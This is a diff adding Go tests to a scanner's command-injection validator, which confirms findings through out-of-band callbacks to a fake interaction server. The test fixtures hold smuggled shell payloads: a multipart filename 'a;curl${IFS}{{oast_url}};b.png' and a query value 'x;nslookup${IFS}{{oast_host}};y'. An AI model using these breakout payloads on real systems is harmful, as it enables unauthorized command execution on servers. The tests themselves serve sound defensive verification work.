@@ -581,6 +581,179 @@ func TestCmdInjOASTNotReproducedVerifierOnly(t *testing.T) {
 	}
 }
 
+// buildCmdInjTokenJob uses token mode: a {{oast_url}} placed inside a shell
+// breakout (here in a multipart filename), which the legacy form-field model
+// could not express.
+func buildCmdInjTokenJob(t *testing.T, port int) validators.Job {
+	t.Helper()
+	ps := strconv.Itoa(port)
+	base := "http://app.example.com:" + ps
+
+	body := "--X\r\nContent-Disposition: form-data; name=\"file\"; " +
+		"filename=\"a;curl${IFS}{{oast_url}};b.png\"\r\nContent-Type: image/png\r\n\r\nPNG\r\n--X--\r\n"
+	ev, _ := json.Marshal(map[string]any{
+		"request": map[string]any{
+			"method": "POST",
+			"url":    base + "/api/upload",
+			"headers": []map[string]string{
+				{"name": "content-type", "value": "multipart/form-data; boundary=X"},
+			},
+			"body": body,
+		},
+		"mutation_slots": map[string]string{
+			"oast_host": "{{oast_url}}",
+		},
+	})
+	proof, _ := json.Marshal(map[string]any{
+		"expected_signal":     "oast_interaction",
+		"poll_window_seconds": 30,
+	})
+	return validators.Job{
+		Finding: evidence.Finding{
+			FindingID: "test-cmdi-token",
+			Type:      "command_injection.oast",
+			Target: evidence.Target{
+				ExpectedOrigin: base,
+				AllowedHosts:   []string{"app.example.com"},
+				AllowedSchemes: []string{"http"},
+				AllowedPorts:   []int{port},
+			},
+			Evidence: ev,
+			Proof:    proof,
+		},
+		Nonce: "cmdi-token-nonce",
+	}
+}
+
+// Token mode: the OAST URL lands inside the shell-breakout multipart filename
+// (not overwriting a parsed field), and an http callback verifies.
+func TestCmdInjOASTTokenBreakoutVerified(t *testing.T) {
+	clk := newTestOASTClock(time.Date(2026, 6, 1, 0, 0, 0, 0, time.UTC))
+	fake := oast.NewFake(clk, "oast.test")
+
+	var receivedBody []byte
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		buf := make([]byte, 8192)
+		n, _ := r.Body.Read(buf)
+		receivedBody = buf[:n]
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer srv.Close()
+
+	ip, port := serverAddr(t, srv)
+	pe := ssrfEnforcer(t, srv)
+	v, _ := validators.Lookup("command_injection.oast")
+	job := buildCmdInjTokenJob(t, port)
+
+	go func() {
+		time.Sleep(2 * time.Millisecond)
+		for i := 0; i < 200; i++ {
+			tok := findFakeToken(fake)
+			if tok != "" {
+				clk.Advance(3 * time.Second)
+				fake.AddInteraction(tok, oast.Interaction{
+					Protocol:  "http",
+					SourceIP:  ip.String(),
+					UserAgent: "curl/8.0",
+					Timestamp: clk.Now(),
+				})
+				return
+			}
+			time.Sleep(2 * time.Millisecond)
+		}
+	}()
+
+	env := validators.Env{
+		Policy:     pe,
+		OAST:       fake,
+		Artifacts:  artifacts.NewStore(),
+		Clock:      clk,
+		PollConfig: fastPollConfig(),
+	}
+
+	res, err := v.Validate(context.Background(), job, env)
+	if err != nil {
+		t.Fatalf("Validate: %v", err)
+	}
+	if res.Verdict != verdict.Verified {
+		t.Fatalf("verdict = %q, want verified", res.Verdict)
+	}
+
+	// The breakout must survive with the full OAST URL substituted into the
+	// filename — the legacy field-overwrite model could not do this.
+	body := string(receivedBody)
+	if !containsSubstring(body, "curl${IFS}") || !containsSubstring(body, "oast.test") {
+		t.Fatalf("OAST URL not placed inside the shell breakout; got body: %q", body)
+	}
+	if containsSubstring(body, "{{oast_url}}") {
+		t.Fatal("token {{oast_url}} was not substituted")
+	}
+}
+
+// Token mode in a query param, DNS callback variant.
+func TestCmdInjOASTTokenQueryHostVerified(t *testing.T) {
+	clk := newTestOASTClock(time.Date(2026, 6, 1, 0, 0, 0, 0, time.UTC))
+	fake := oast.NewFake(clk, "oast.test")
+
+	var gotURL string
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		gotURL = r.URL.String()
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer srv.Close()
+
+	ip, port := serverAddr(t, srv)
+	pe := ssrfEnforcer(t, srv)
+	v, _ := validators.Lookup("command_injection.oast")
+
+	ps := strconv.Itoa(port)
+	base := "http://app.example.com:" + ps
+	ev, _ := json.Marshal(map[string]any{
+		"request": map[string]any{
+			"method": "GET",
+			"url":    base + "/diag?host=x;nslookup${IFS}{{oast_host}};y",
+		},
+		"mutation_slots": map[string]string{"oast_host": "{{oast_host}}"},
+	})
+	proof, _ := json.Marshal(map[string]any{"expected_signal": "oast_interaction", "poll_window_seconds": 30})
+	job := validators.Job{
+		Finding: evidence.Finding{
+			FindingID: "test-cmdi-token-q",
+			Type:      "command_injection.oast",
+			Target: evidence.Target{
+				ExpectedOrigin: base, AllowedHosts: []string{"app.example.com"},
+				AllowedSchemes: []string{"http"}, AllowedPorts: []int{port},
+			},
+			Evidence: ev, Proof: proof,
+		},
+		Nonce: "cmdi-q-nonce",
+	}
+
+	go func() {
+		time.Sleep(2 * time.Millisecond)
+		for i := 0; i < 200; i++ {
+			if tok := findFakeToken(fake); tok != "" {
+				clk.Advance(3 * time.Second)
+				fake.AddInteraction(tok, oast.Interaction{Protocol: "dns", SourceIP: ip.String(), Timestamp: clk.Now()})
+				return
+			}
+			time.Sleep(2 * time.Millisecond)
+		}
+	}()
+
+	env := validators.Env{Policy: pe, OAST: fake, Artifacts: artifacts.NewStore(), Clock: clk, PollConfig: fastPollConfig()}
+	res, err := v.Validate(context.Background(), job, env)
+	if err != nil {
+		t.Fatalf("Validate: %v", err)
+	}
+	if res.Verdict != verdict.Verified {
+		t.Fatalf("verdict = %q, want verified", res.Verdict)
+	}
+	if !containsSubstring(gotURL, "nslookup") || !containsSubstring(gotURL, "oast.test") || containsSubstring(gotURL, "{{oast_host}}") {
+		t.Fatalf("oast_host token not substituted into query breakout; got %q", gotURL)
+	}
+}
+
 // --- Blind XSS tests ---
 
 func buildBlindXSSJob(t *testing.T, port int) validators.Job {
